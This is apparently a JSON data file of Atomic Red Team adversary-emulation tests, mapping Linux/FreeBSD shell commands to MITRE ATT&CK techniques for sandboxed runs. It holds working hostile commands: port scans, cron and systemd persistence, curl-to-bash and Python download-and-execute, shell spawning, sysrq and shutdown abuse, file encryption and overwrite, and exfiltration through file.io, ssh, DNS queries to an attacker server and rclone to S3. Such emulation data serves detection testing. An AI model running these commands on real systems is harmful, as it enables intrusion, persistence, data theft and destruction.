+"sandbox": "1773626867_T1614.001_6_389",
+"tactic": "discovery",
+"technique": "T1614.001",
+"test": "6",
+"test_name": "Discover System Language by Environment Variable Query"
+},
+{
+"command": "curl -k #{ip_lookup_url}",
+"row_index": 390,
+"sandbox": "1773626987_T1614_2_390",
+"tactic": "discovery",
+"technique": "T1614",
+"test": "2",
+"test_name": "Get geolocation info through IP-Lookup services using curl freebsd, linux or macos"
+},
+{
+"command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'",
+"row_index": 391,
+"sandbox": "1773627107_T1518.001_4_391",
+"tactic": "discovery",
+"technique": "T1518.001",
+"test": "4",
+"test_name": "Security Software Discovery - ps (Linux)"
+},
+{
+"command": "pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'",
+"row_index": 392,
+"sandbox": "1773627228_T1518.001_5_392",
+"tactic": "discovery",
+"technique": "T1518.001",
+"test": "5",
+"test_name": "Security Software Discovery - pgrep (FreeBSD)"
+},
+{
+"command": "arp -a | grep -v '^?'",
+"row_index": 393,
+"sandbox": "1773627348_T1018_6_393",
+"tactic": "discovery",
+"technique": "T1018",
+"test": "6",
+"test_name": "Remote System Discovery - arp nix"
+},
+{
+"command": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done",
+"row_index": 394,
+"sandbox": "1773627468_T1018_7_394",
+"tactic": "discovery",
+"technique": "T1018",
+"test": "7",
+"test_name": "Remote System Discovery - sweep"
+},
+{
+"command": "ip neighbour show",
+"row_index": 395,
+"sandbox": "1773627588_T1018_12_395",
+"tactic": "discovery",
+"technique": "T1018",
+"test": "12",
+"test_name": "Remote System Discovery - ip neighbour"
+},
+{
+"command": "ip route show",
+"row_index": 396,
+"sandbox": "1773627708_T1018_13_396",
+"tactic": "discovery",
+"technique": "T1018",
+"test": "13",
+"test_name": "Remote System Discovery - ip route"
+},
+{
+"command": "netstat -r | grep default",
+"row_index": 397,
+"sandbox": "1773627828_T1018_14_397",
+"tactic": "discovery",
+"technique": "T1018",
+"test": "14",
+"test_name": "Remote System Discovery - netstat"
+},
+{
+"command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"",
+"row_index": 398,
+"sandbox": "1773627948_T1018_15_398",
+"tactic": "discovery",
+"technique": "T1018",
+"test": "15",
+"test_name": "Remote System Discovery - ip tcp_metrics"
+},
+{
+"command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done",
+"row_index": 399,
+"sandbox": "1773628068_T1046_1_399",
+"tactic": "discovery",
+"technique": "T1046",
+"test": "1",
+"test_name": "Port Scan"
+},
+{
+"command": "sudo nmap -sS #{network_range} -p #{port} && telnet #{host} #{port} && nc -nv #{host} #{port}",
+"row_index": 400,
+"sandbox": "1773628188_T1046_2_400",
+"tactic": "discovery",
+"technique": "T1046",
+"test": "2",
+"test_name": "Port Scan Nmap"
+},
+{
+"command": "nmap -Pn -sV -p #{port_range} #{host}",
+"row_index": 401,
+"sandbox": "1773628309_T1046_12_401",
+"tactic": "discovery",
+"technique": "T1046",
+"test": "12",
+"test_name": "Port Scan using nmap (Port range)"
+},
+{
+"command": "date",
+"row_index": 402,
+"sandbox": "1773628429_T1124_3_402",
+"tactic": "discovery",
+"technique": "T1124",
+"test": "3",
+"test_name": "System Time Discovery in FreeBSD/macOS"
+},
+{
+"command": "crontab -l > /tmp/notevil && echo \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}",
+"row_index": 403,
+"sandbox": "1773628549_T1053.003_1_403",
+"tactic": "execution",
+"technique": "T1053.003",
+"test": "1",
+"test_name": "Cron - Replace crontab with referenced file"
+},
+{
+"command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name} && echo \"#{command}\" > /etc/cron.hourly/#{cron_script_name} && echo \"#{command}\" > /etc/cron.monthly/#{cron_script_name} && echo \"#{command}\" > /etc/cron.weekly/#{cron_script_name}",
+"row_index": 404,
+"sandbox": "1773628669_T1053.003_2_404",
+"tactic": "execution",
+"technique": "T1053.003",
+"test": "2",
+"test_name": "Cron - Add script to all cron subfolders"
+},
+{
+"command": "echo \"#{command}\" > /etc/cron.d/#{cron_script_name}",
+"row_index": 405,
+"sandbox": "1773628789_T1053.003_3_405",
+"tactic": "execution",
+"technique": "T1053.003",
+"test": "3",
+"test_name": "Cron - Add script to /etc/cron.d folder"
+},
+{
+"command": "echo \"#{command}\" >> /var/spool/cron/crontabs/#{cron_script_name}",
+"row_index": 406,
+"sandbox": "1773628909_T1053.003_4_406",
+"tactic": "execution",
+"technique": "T1053.003",
+"test": "4",
+"test_name": "Cron - Add script to /var/spool/cron/crontabs/ folder"
+},
+{
+"command": "echo \"[Unit]\" > #{path_to_systemd_service} && echo \"Description=Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_service} && echo \"[Service]\" >> #{path_to_systemd_service} && echo \"Type=simple\" >> #{path_to_systemd_service} && echo \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service} && echo \"[Install]\" >> #{path_to_systemd_service} && echo \"WantedBy=multi-user.target\" >> #{path_to_systemd_service} && echo \"[Unit]\" > #{path_to_systemd_timer} && echo \"Description=Executes Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_timer} && echo \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer} && echo \"[Timer]\" >> #{path_to_systemd_timer} && echo \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer} && echo \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer} && echo \"[Install]\" >> #{path_to_systemd_timer} && echo \"WantedBy=timers.target\" >> #{path_to_systemd_timer} && systemctl start #{systemd_timer_name} && systemctl enable #{systemd_timer_name} && systemctl daemon-reload",
+"row_index": 407,
+"sandbox": "1773629029_T1053.006_1_407",
+"tactic": "execution",
+"technique": "T1053.006",
+"test": "1",
+"test_name": "Create Systemd Service and Timer"
+},
+{
+"command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'",
+"row_index": 408,
+"sandbox": "1773629149_T1053.006_2_408",
+"tactic": "execution",
+"technique": "T1053.006",
+"test": "2",
+"test_name": "Create a user level transient systemd service and timer"
+},
+{
+"command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'",
+"row_index": 409,
+"sandbox": "1773629269_T1053.006_3_409",
+"tactic": "execution",
+"technique": "T1053.006",
+"test": "3",
+"test_name": "Create a system level transient systemd service and timer"
+},
+{
+"command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > #{script_path}\" && sh -c \"echo 'ping -c 4 #{host}' >> #{script_path}\" && chmod +x #{script_path} && sh #{script_path}",
+"row_index": 410,
+"sandbox": "1773629390_T1059.004_1_410",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "1",
+"test_name": "Create and Execute Bash Shell Script"
+},
+{
+"command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash && wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash",
+"row_index": 411,
+"sandbox": "1773629510_T1059.004_2_411",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "2",
+"test_name": "Command-Line Interface"
+},
+{
+"command": "chmod +x #{autosuid} && bash #{autosuid}",
+"row_index": 412,
+"sandbox": "1773629630_T1059.004_3_412",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "3",
+"test_name": "Harvest SUID executable files"
+},
+{
+"command": "chmod +x #{linenum} && bash #{linenum}",
+"row_index": 413,
+"sandbox": "1773629750_T1059.004_4_413",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "4",
+"test_name": "LinEnum tool execution"
+},
+{
+"command": "TMPFILE=$(mktemp) && echo \"id\" > $TMPFILE && bash $TMPFILE",
+"row_index": 414,
+"sandbox": "1773629870_T1059.004_5_414",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "5",
+"test_name": "New script file in the tmp directory"
+},
+{
+"command": "echo $0 && if $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi && if $(printenv SHELL >/dev/null); then printenv SHELL; fi",
+"row_index": 415,
+"sandbox": "1773629990_T1059.004_6_415",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "6",
+"test_name": "What shell is running"
+},
+{
+"command": "cat /etc/shells",
+"row_index": 416,
+"sandbox": "1773630110_T1059.004_7_416",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "7",
+"test_name": "What shells are available"
+},
+{
+"command": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done",
+"row_index": 417,
+"sandbox": "1773630230_T1059.004_8_417",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "8",
+"test_name": "Command line scripts"
+},
+{
+"command": "[ \"$(uname)\" = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\" && ART=$(echo -n \"id\" | $encodecmd) && echo \"\\$ART=$ART\" && echo -n \"$ART\" | $decodecmd |/bin/bash && unset ART",
+"row_index": 418,
+"sandbox": "1773630351_T1059.004_9_418",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "9",
+"test_name": "Obfuscated command line scripts"
+},
+{
+"command": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art && cat /etc/passwd |grep ^art && chsh -s /bin/sh art && cat /etc/passwd |grep ^art",
+"row_index": 419,
+"sandbox": "1773630471_T1059.004_10_419",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "10",
+"test_name": "Change login shell"
+},
+{
+"command": "export ART='echo \"Atomic Red Team was here... T1059.004\"' && echo $ART |/bin/sh",
+"row_index": 420,
+"sandbox": "1773630591_T1059.004_11_420",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "11",
+"test_name": "Environment variable scripts"
+},
+{
+"command": "cd /tmp && curl -s #{remote_url} |bash && ls -la /tmp/art.txt",
+"row_index": 421,
+"sandbox": "1773630711_T1059.004_12_421",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "12",
+"test_name": "Detecting pipe-to-shell"
+},
+{
+"command": "uname -srm",
+"row_index": 422,
+"sandbox": "1773630831_T1059.004_13_422",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "13",
+"test_name": "Current kernel information enumeration"
+},
+{
+"command": "awk 'BEGIN {system(\"/bin/sh &\")}'",
+"row_index": 423,
+"sandbox": "1773630951_T1059.004_14_423",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "14",
+"test_name": "Shell Creation using awk command"
+},
+{
+"command": "echo '! exec \"/bin/sh &\"' | PERL_MM_USE_DEFAULT=1  cpan",
+"row_index": 424,
+"sandbox": "1773631071_T1059.004_15_424",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "15",
+"test_name": "Creating shell using cpan command"
+},
+{
+"command": "busybox sh &",
+"row_index": 425,
+"sandbox": "1773631192_T1059.004_16_425",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "16",
+"test_name": "Shell Creation using busybox command"
+},
+{
+"command": "sudo emacs -Q -nw --eval '(term \"/bin/sh &\")'",
+"row_index": 426,
+"sandbox": "1773631312_T1059.004_17_426",
+"tactic": "execution",
+"technique": "T1059.004",
+"test": "17",
+"test_name": "emacs spawning an interactive system shell"
+},
+{
+"command": "which_python=$(which python || which python3 || which python3.9 || which python2) && $which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'",
+"row_index": 427,
+"sandbox": "1773631432_T1059.006_1_427",
+"tactic": "execution",
+"technique": "T1059.006",
+"test": "1",
+"test_name": "Execute shell script via python's command mode arguement"
+},
+{
+"command": "which_python=$(which python || which python3 || which python3.9 || which python2) && echo 'import requests' > #{python_script_name} && echo 'import os' >> #{python_script_name} && echo 'url = \"#{script_url}\"' >> #{python_script_name} && echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name} && echo 'session = requests.session()' >> #{python_script_name} && echo 'source = session.get(url).content' >> #{python_script_name} && echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name} && echo 'fd.write(source)' >> #{python_script_name} && echo 'fd.close()' >> #{python_script_name} && echo 'os.system(malicious_command)' >> #{python_script_name} && $which_python #{python_script_name}",
+"row_index": 428,
+"sandbox": "1773631552_T1059.006_2_428",
+"tactic": "execution",
+"technique": "T1059.006",
+"test": "2",
+"test_name": "Execute Python via scripts"
+},
+{
+"command": "which_python=$(which python || which python3 || which python3.9 || which python2) && echo 'import requests' > #{python_script_name} && echo 'import os' >> #{python_script_name} && echo 'url = \"#{script_url}\"' >> #{python_script_name} && echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name} && echo 'session = requests.session()' >> #{python_script_name} && echo 'source = session.get(url).content' >> #{python_script_name} && echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name} && echo 'fd.write(source)' >> #{python_script_name} && echo 'fd.close()' >> #{python_script_name} && echo 'os.system(malicious_command)' >> #{python_script_name} && $which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")' && $which_python #{python_binary_name}",
+"row_index": 429,
+"sandbox": "1773631672_T1059.006_3_429",
+"tactic": "execution",
+"technique": "T1059.006",
+"test": "3",
+"test_name": "Execute Python via Python executables"
+},
+{
+"command": "which_python=$(which python || which python3 || which python3.9 || which python2) && $which_python -c \"import pty;pty.spawn('/bin/sh')\" && exit && $which_python -c \"import pty;pty.spawn('/bin/bash')\" && exit",
+"row_index": 430,
+"sandbox": "1773631792_T1059.006_4_430",
+"tactic": "execution",
+"technique": "T1059.006",
+"test": "4",
+"test_name": "Python pty module and spawn function used to spawn sh or bash"
+},
+{
+"command": "echo \"#{at_command}\" | at #{time_spec}",
+"row_index": 431,
+"sandbox": "1773631912_T1053.002_2_431",
+"tactic": "execution",
+"technique": "T1053.002",
+"test": "2",
+"test_name": "At - Schedule a job"
+},
+{
+"command": "sudo systemctl stop #{service_name}",
+"row_index": 432,
+"sandbox": "1773632032_T1489_4_432",
+"tactic": "impact",
+"technique": "T1489",
+"test": "4",
+"test_name": "Linux - Stop service using systemctl"
+},
+{
+"command": "sudo killall -SIGTERM #{process_name}",
+"row_index": 433,
+"sandbox": "1773632153_T1489_5_433",
+"tactic": "impact",
+"technique": "T1489",
+"test": "5",
+"test_name": "Linux - Stop service by killing process using killall"
+},
+{
+"command": "sudo kill -SIGTERM $(pgrep #{process_name})",
+"row_index": 434,
+"sandbox": "1773632273_T1489_6_434",
+"tactic": "impact",
+"technique": "T1489",
+"test": "6",
+"test_name": "Linux - Stop service by killing process using kill"
+},
+{
+"command": "sudo pkill -SIGTERM #{process_pattern}",
+"row_index": 435,
+"sandbox": "1773632393_T1489_7_435",
+"tactic": "impact",
+"technique": "T1489",
+"test": "7",
+"test_name": "Linux - Stop service by killing process using pkill"
+},
+{
+"command": "echo \"e\" > /proc/sysrq-trigger",
+"row_index": 436,
+"sandbox": "1773632513_T1489_8_436",
+"tactic": "impact",
+"technique": "T1489",
+"test": "8",
+"test_name": "Abuse of linux magic system request key for Send a SIGTERM to all processes"
+},
+{
+"command": "passwd #{user_account} #enter admin password > enter new password > confirm new password",
+"row_index": 437,
+"sandbox": "1773632633_T1531_4_437",
+"tactic": "impact",
+"technique": "T1531",
+"test": "4",
+"test_name": "Change User Password via passwd"
+},
+{
+"command": "echo \"#{pwd_for_encrypted_file}\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}",
+"row_index": 438,
+"sandbox": "1773632753_T1486_1_438",
+"tactic": "impact",
+"technique": "T1486",
+"test": "1",
+"test_name": "Encrypt files using gpg (FreeBSD/Linux)"
+},
+{
+"command": "$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}",
+"row_index": 439,
+"sandbox": "1773632873_T1486_2_439",
+"tactic": "impact",
+"technique": "T1486",
+"test": "2",
+"test_name": "Encrypt files using 7z (FreeBSD/Linux)"
+},
+{
+"command": "which_ccencrypt=`which ccencrypt` && cp #{root_input_file_path} #{cped_file_path}; && $which_ccencrypt -T -K #{pwd_for_encrypted_file} #{cped_file_path}",
+"row_index": 440,
+"sandbox": "1773632993_T1486_3_440",
+"tactic": "impact",
+"technique": "T1486",
+"test": "3",
+"test_name": "Encrypt files using ccrypt (FreeBSD/Linux)"
+},
+{
+"command": "which_openssl=`which openssl` && $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size} && $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path} && $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}",
+"row_index": 441,
+"sandbox": "1773633113_T1486_4_441",
+"tactic": "impact",
+"technique": "T1486",
+"test": "4",
+"test_name": "Encrypt files using openssl (FreeBSD/Linux)"
+},
+{
+"command": "yes > /dev/null",
+"row_index": 442,
+"sandbox": "1773633234_T1496_1_442",
+"tactic": "impact",
+"technique": "T1496",
+"test": "1",
+"test_name": "FreeBSD/macOS/Linux - Simulate CPU Load with Yes"
+},
+{
+"command": "dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes",
+"row_index": 443,
+"sandbox": "1773633354_T1485_2_443",
+"tactic": "impact",
+"technique": "T1485",
+"test": "2",
+"test_name": "FreeBSD/macOS/Linux - Overwrite file with DD"
+},
+{
+"command": "shutdown -r #{timeout}",
+"row_index": 444,
+"sandbox": "1773633474_T1529_3_444",
+"tactic": "impact",
+"technique": "T1529",
+"test": "3",
+"test_name": "Restart System via `shutdown` - FreeBSD/macOS/Linux"
+},
+{
+"command": "shutdown -h #{timeout}",
+"row_index": 445,
+"sandbox": "1773633594_T1529_4_445",
+"tactic": "impact",
+"technique": "T1529",
+"test": "4",
+"test_name": "Shutdown System via `shutdown` - FreeBSD/macOS/Linux"
+},
+{
+"command": "reboot",
+"row_index": 446,
+"sandbox": "1773633714_T1529_5_446",
+"tactic": "impact",
+"technique": "T1529",
+"test": "5",
+"test_name": "Restart System via `reboot` - FreeBSD/macOS/Linux"
+},
+{
+"command": "halt -p",
+"row_index": 447,
+"sandbox": "1773633834_T1529_6_447",
+"tactic": "impact",
+"technique": "T1529",
+"test": "6",
+"test_name": "Shutdown System via `halt` - FreeBSD/Linux"
+},
+{
+"command": "halt -r",
+"row_index": 448,
+"sandbox": "1773633954_T1529_7_448",
+"tactic": "impact",
+"technique": "T1529",
+"test": "7",
+"test_name": "Reboot System via `halt` - FreeBSD"
+},
+{
+"command": "halt --reboot",
+"row_index": 449,
+"sandbox": "1773634074_T1529_8_449",
+"tactic": "impact",
+"technique": "T1529",
+"test": "8",
+"test_name": "Reboot System via `halt` - Linux"
+},
+{
+"command": "poweroff",
+"row_index": 450,
+"sandbox": "1773634195_T1529_9_450",
+"tactic": "impact",
+"technique": "T1529",
+"test": "9",
+"test_name": "Shutdown System via `poweroff` - FreeBSD/Linux"
+},
+{
+"command": "poweroff -r 3",
+"row_index": 451,
+"sandbox": "1773634315_T1529_10_451",
+"tactic": "impact",
+"technique": "T1529",
+"test": "10",
+"test_name": "Reboot System via `poweroff` - FreeBSD"
+},
+{
+"command": "poweroff --reboot",
+"row_index": 452,
+"sandbox": "1773634435_T1529_11_452",
+"tactic": "impact",
+"technique": "T1529",
+"test": "11",
+"test_name": "Reboot System via `poweroff` - Linux"
+},
+{
+"command": "echo \"b\" > /proc/sysrq-trigger",
+"row_index": 453,
+"sandbox": "1773634555_T1529_16_453",
+"tactic": "impact",
+"technique": "T1529",
+"test": "16",
+"test_name": "Abuse of Linux Magic System Request Key for Reboot"
+},
+{
+"command": "kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach --rm -i -- bash -lc \"mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json\"",
+"row_index": 454,
+"sandbox": "1773634675_T1195.002_1_454",
+"tactic": "initial-access",
+"technique": "T1195.002",
+"test": "1",
+"test_name": "Simulate npm package installation on a Linux system"
+},
+{
+"command": "password=$(openssl passwd -1 art) && ([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) && su art -c \"whoami; exit\"",
+"row_index": 455,
+"sandbox": "1773634795_T1078.003_8_455",
+"tactic": "initial-access",
+"technique": "T1078.003",
+"test": "8",
+"test_name": "Create local account (Linux)"
+},
+{
+"command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art && usermod --lock art && usermod --expiredate \"1\" art && usermod --unlock art && usermod --expiredate \"99999\" art && su -c whoami art",
+"row_index": 456,
+"sandbox": "1773634915_T1078.003_9_456",
+"tactic": "initial-access",
+"technique": "T1078.003",
+"test": "9",
+"test_name": "Reactivate a locked/expired account (Linux)"
+},
+{
+"command": "pw useradd art -g wheel -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0 && pw lock art && pw usermod art -e +1d && pw unlock art && pw user mod art -e +99d && su art && whoami && exit",
+"row_index": 457,
+"sandbox": "1773635035_T1078.003_10_457",
+"tactic": "initial-access",
+"technique": "T1078.003",
+"test": "10",
+"test_name": "Reactivate a locked/expired account (FreeBSD)"
+},
+{
+"command": "cat /etc/passwd |grep nobody && chsh --shell /bin/bash nobody && usermod --password $(openssl passwd -1 nobody) nobody && su -c \"whoami\" nobody",
+"row_index": 458,
+"sandbox": "1773635155_T1078.003_11_458",
+"tactic": "initial-access",
+"technique": "T1078.003",
+"test": "11",
+"test_name": "Login as nobody (Linux)"
+},
+{
+"command": "cat /etc/passwd |grep nobody && pw usermod nobody -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user nobody -h 0 && su nobody && whoami && exit",
+"row_index": 459,
+"sandbox": "1773635276_T1078.003_12_459",
+"tactic": "initial-access",
+"technique": "T1078.003",
+"test": "12",
+"test_name": "Login as nobody (freebsd)"
+},
+{
+"command": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/",
+"row_index": 460,
+"sandbox": "1773635396_T1048.002_2_460",
+"tactic": "exfiltration",
+"technique": "T1048.002",
+"test": "2",
+"test_name": "Exfiltrate data HTTPS using curl freebsd,linux or macos"
+},
+{
+"command": "wget --post-file=\"#{input_file}\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after",
+"row_index": 461,
+"sandbox": "1773635516_T1048.002_3_461",
+"tactic": "exfiltration",
+"technique": "T1048.002",
+"test": "3",
+"test_name": "Exfiltrate data in a file over HTTPS using wget"
+},
+{
+"command": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after",
+"row_index": 462,
+"sandbox": "1773635636_T1048.002_4_462",
+"tactic": "exfiltration",
+"technique": "T1048.002",
+"test": "4",
+"test_name": "Exfiltrate data as text over HTTPS using wget"
+},
+{
+"command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz",
+"row_index": 463,
+"sandbox": "1773635756_T1048_1_463",
+"tactic": "exfiltration",
+"technique": "T1048",
+"test": "1",
+"test_name": "Exfiltration Over Alternative Protocol - SSH"
+},
+{
+"command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'",
+"row_index": 464,
+"sandbox": "1773635876_T1048_2_464",
+"tactic": "exfiltration",
+"technique": "T1048",
+"test": "2",
+"test_name": "Exfiltration Over Alternative Protocol - SSH"
+},
+{
+"command": "dig @#{attacker_dns_server} -p #{dns_port} $(echo \"#{secret_info}\" | base64).google.com",
+"row_index": 465,
+"sandbox": "1773635996_T1048_4_465",
+"tactic": "exfiltration",
+"technique": "T1048",
+"test": "4",
+"test_name": "Exfiltrate Data using DNS Queries via dig"
+},
+{
+"command": "Write-Host \"Deploying AWS infrastructure... \" -NoNewLine && $awsAccessKey = \"#{aws_access_key}\" && $awsSecretKey = \"#{aws_secret_key}\" && cd PathToAtomicsFolder/T1567.002/src/ && if ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") { && $env:AWS_PROFILE = \"#{aws_profile}\" && } else { && $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\" && $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\" && } && $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init && $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var \"aws_region=#{aws_region}\" -auto-approve && Write-Host \"Done!\" && Write-Host \"Generating rclone config... \" -NoNewLine && $config = @\" && [exfils3] && type = s3 && provider = AWS && env_auth = true && region = #{aws_region} && \"@ && $config | Out-File -FilePath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\" -Encoding ascii && Write-Host \"Done!\" && Write-Host \"Exfiltrating data... \" -NoNewLine && $bucket = \"$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)\".Replace(\"`\"\",\"\") && cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v* && $null = ./rclone copy --max-size 1700k \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/\" exfils3:$bucket --config \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\" && Write-Host \"Done!\"",
+"row_index": 466,
+"sandbox": "1773636116_T1567.002_2_466",
+"tactic": "exfiltration",
+"technique": "T1567.002",
+"test": "2",
+"test_name": "Exfiltrate data with rclone to cloud Storage - AWS S3"
+},
+{
+"command": "cd #{folder_path}; split -b 5000000 #{file_name} && ls -l #{folder_path}",
+"row_index": 467,
+"sandbox": "1773636236_T1030_1_467",
+"tactic": "exfiltration",
+"technique": "T1030",
+"test": "1",
+"test_name": "Data Transfer Size Limits"
+},
+{
+"command": "1. Victim System Configuration: && mkdir /tmp/victim-staging-area && echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt && 2. Using Python to establish a one-line HTTP server on victim system: && cd /tmp/victim-staging-area && python -m SimpleHTTPServer 1337 && 3. To retrieve the data from an adversary system: && wget http://VICTIM_IP:1337/victim-file.txt",
+"row_index": 468,
+"sandbox": "1773636357_T1048.003_1_468",
+"tactic": "exfiltration",
+"technique": "T1048.003",
+"test": "1",
+"test_name": "Exfiltration Over Alternative Protocol - HTTP"
+},
+{
+"command": "1. On the adversary machine run the below command. && tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\\\\".domain\\\\\"\" >> received_data.txt && 2. On the victim machine run the below commands. && xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done && 3. Once the data is received, use the below command to recover the data. && cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r",
+"row_index": 469,
+"sandbox": "1773636477_T1048.003_3_469",
+"tactic": "exfiltration",
+"technique": "T1048.003",
+"test": "3",
+"test_name": "Exfiltration Over Alternative Protocol - DNS"
+},
+{
+"command": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9 && if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi",
+"row_index": 470,
+"sandbox": "1773636597_T1048.003_8_470",
+"tactic": "exfiltration",
+"technique": "T1048.003",
+"test": "8",
+"test_name": "Python3 http.server"
+}
+]
